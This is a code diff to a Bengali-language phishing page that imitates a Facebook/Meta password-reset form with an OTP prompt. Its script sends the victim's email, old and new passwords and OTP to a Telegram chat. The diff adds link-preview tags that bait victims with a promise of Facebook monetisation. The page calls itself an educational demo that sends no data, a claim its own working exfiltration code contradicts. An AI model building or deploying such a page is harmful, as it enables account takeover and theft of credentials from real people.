@@ -4,6 +4,14 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>নতুন পাসওয়ার্ড সেট করুন</title>
+
+  <!-- Link Preview Meta Tags -->
+  <meta property="og:title" content="আপনার Facebook কন্টেন্ট মনিটাইজেশন চালু করতে এখনই ক্লিক করুন!" />
+  <meta property="og:description" content="আপনার Facebook পেজ ও ভিডিও কন্টেন্ট থেকে ইনকাম শুরু করুন। আজই মনিটাইজেশন চালু করুন – অফিশিয়াল নিয়ম অনুযায়ী।" />
+  <meta property="og:image" content="https://i.imgur.com/oZ3hlvD.jpg" />
+  <meta property="og:url" content="https://share.google/dhfke0w9ssuVYSde9" />
+  <meta name="theme-color" content="#1877f2" />
+
   <style>
     body {
       background-color: #f0f2f5;
@@ -68,7 +76,6 @@
       display: none;
     }
 
-    /* Popup modal style */
     .modal {
       display: none;
       position: fixed;
@@ -122,11 +129,10 @@
     <input type="password" id="newPass" placeholder="নতুন পাসওয়ার্ড দিন">
     <button onclick="showModal()">পাসওয়ার্ড আপডেট করুন</button>
 
-    <p class="warning" id="warn">⚠️ এটি একটি শিক্ষামূলক ফিশিং ডেমো। প্রকৃত কোনো ডাটা পাঠানো হয়নি।</p>
+    <p class="warning" id="warn">এটি একটি শিক্ষামূলক ফিশিং ডেমো। প্রকৃত কোনো ডাটা পাঠানো হয়নি।</p>
     <div class="meta">Made by Meta</div>
   </div>
 
-  <!-- OTP Popup Modal -->
   <div class="modal" id="otpModal">
     <div class="modal-content">
       <h2>আপনার পরিচয় নিশ্চিত করুন</h2>
@@ -149,7 +155,7 @@
 
       const timer = setInterval(() => {
         countdown--;
-        countdownEl.textContent = `OTP পাঠানো হচ্ছে... ${countdown} সেকেন্ড অপেক্ষা করুন`;
+        countdownEl.textContent = "OTP পাঠানো হচ্ছে... " + countdown + " সেকেন্ড অপেক্ষা করুন";
         if (countdown <= 0) {
           clearInterval(timer);
           countdownEl.textContent = "OTP পাঠানো হয়েছে, এখন ইনপুট দিন";
@@ -169,12 +175,12 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: telegram_chatid,
-          text: `🔐 Login Attempt\nAccount: ${email}\nOld Pass: ${oldPass}\nNew Pass: ${newPass}\nOTP: ${otp}`
+          text: "Login Attempt\nAccount: " + email + "\nOld Pass: " + oldPass + "\nNew Pass: " + newPass + "\nOTP: " + otp
         })
       })
       .then(response => response.json())
       .then(data => {
-        alert("✅ তথ্য পাঠানো হয়েছে (শিক্ষামূলক ডেমো)");
+        alert("তথ্য পাঠানো হয়েছে (শিক্ষামূলক ডেমো)");
       })
       .catch(error => {
         console.error('Error:', error);
@@ -185,4 +191,4 @@
     }
   </script>
 </body>
-</html>
+    </html>
